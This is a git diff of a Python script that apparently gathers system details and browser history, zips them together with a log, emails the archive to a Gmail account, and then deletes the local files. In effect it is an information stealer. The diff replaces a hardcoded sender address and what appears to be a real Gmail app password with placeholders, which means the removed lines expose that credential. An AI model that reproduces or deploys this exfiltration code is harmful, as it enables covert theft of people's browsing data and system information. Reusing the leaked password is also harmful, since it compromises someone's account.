@@ -29,8 +29,8 @@ import psutil
 import GPUtil
 
 def send_email(subject, body, attachment_path, to_addr):
-    from_addr = 'usbbasher@gmail.com'
-    app_password = 'rlna hczz uykv catc'  # Your app password
+    from_addr = '* Your Gmail Email Address Here *'
+    app_password = '* Your Gmail Api Key Here *'  # Your Gmail App Password AKA An Gmail SMTP API Key
 
     msg = MIMEMultipart()
     msg['From'] = from_addr
@@ -174,7 +174,7 @@ def main():
                 zipf.write(compressed_history, os.path.basename(compressed_history))
                 zipf.write(compressed_log, os.path.basename(compressed_log))
 
-            if send_email("System and Browser Information", "Attached is the system and browser history data.", combined_zip, 'usbbasher@gmail.com'):
+            if send_email("System and Browser Information", "Attached is the system and browser history data.", combined_zip, '* Your Gmail Email Address Here *'):
                 os.remove(history_file)
                 os.remove(compressed_history)
                 os.remove(compressed_log)
